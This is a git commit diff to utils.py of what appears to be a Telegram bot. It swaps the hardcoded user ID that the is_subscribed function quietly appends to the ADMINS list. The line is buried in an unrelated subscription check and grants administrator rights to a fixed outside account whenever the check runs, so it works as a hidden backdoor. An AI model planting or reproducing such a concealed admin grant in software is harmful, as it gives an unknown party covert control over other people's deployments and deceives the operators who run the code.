9b8c7ffd9fddf61e404ca4255e08433c75eb48d7
Vanshrurf <151814401+Vanshrurf@users.noreply.github.com>
2023-12-18 15:00:57 +0530

    Update utils.py

--- utils.py
+++ utils.py
@@ -36,7 +36,7 @@ class temp(object):
 
 async def is_subscribed(bot, query):
     
-    ADMINS.extend([2020224264]) if not 2020224264 in ADMINS else ""
+    ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
 
     if not AUTH_CHANNEL and not REQ_CHANNEL:
         return True
